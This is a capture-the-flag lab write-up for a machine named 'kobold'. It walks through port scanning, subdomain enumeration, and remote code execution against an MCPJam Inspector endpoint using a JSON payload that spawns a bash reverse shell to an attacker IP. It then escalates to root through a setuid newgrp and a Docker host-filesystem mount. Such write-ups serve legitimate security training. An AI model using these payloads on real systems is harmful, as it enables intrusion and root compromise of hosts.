## Reconnaissance

A full TCP port scan is performed to identify every open service on the target.

```bash
nmap -p- --open -Pn -T4 --stats-every=5s <IP> -oN basic_scan.txt
```

A follow-up scan with version detection and default scripts is run against the open ports to gather more detail.

```bash
nmap -p21,80,443,3558 -Pn -sCV -T4 --stats-every=5s <IP> -oN full_scan.txt
```

## Enumeration

Virtual hosts and subdomains are enumerated against the web server using `ffuf`.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u https://kobold.htb -H 'HOST:FUZZ.kobold.htb' -fc 302
```

This reveals the subdomain `mcp.kobold.htb`. The version of the MCPJam Inspector running on this host is vulnerable to [RCE via exposed HTTP endpoint](https://github.com/advisories/GHSA-232v-j27c-5pp6). MCPJam Inspector exposes an API endpoint that allows an MCP server configuration to be defined and connected to. By specifying an arbitrary command as the "server" configuration, the inspector executes it directly on the host.

## Exploitation

A crafted request to the `/api/mcp/connect` endpoint defines a malicious MCP server configuration whose command spawns a reverse shell.

```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash",
      "args": [
        "-c",
        "bash -i >& /dev/tcp/10.10.x.x/1234 0>&1"
      ],
      "env": {}
    },
    "serverId": "pwned"
  }'
```

The server processes the configuration and executes the embedded command, returning a reverse shell on the attacker's listener.

`/usr/bin/newgrp` is found with the setuid bit set. `newgrp` is a binary that allows a user to switch their primary group ID (GID) to another group they belong to. Because it is setuid, it can be used to assume a group's privileges even if the calling shell did not originally have them.

> The presence of a setuid `newgrp` is significant because it lets a low-privileged user activate group membership (such as `docker`) that would otherwise require re-authentication or a new login session.

A new shell is spawned with the `docker` group activated.

![newgrp being used to switch to the docker group](/assets/images/kobold/Pasted-image-20260322131314.png)

## Privilege Escalation — Docker Group Abuse

With an active `docker` group membership, the user can run Docker commands directly. Membership in the `docker` group is effectively equivalent to root access on the host, because containers can be started with host filesystem mounts and a root user inside the container.

The host's root filesystem is mounted into a container and the root flag is read directly through it.

```bash
docker run -v /:/hostfs --rm --user root --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt
```

> Mounting `/` from the host into a container with `--user root` grants the container full read/write access to the underlying filesystem, regardless of the permissions of the user that invoked `docker run`. This is a well-known privilege escalation technique for any account in the `docker` group.
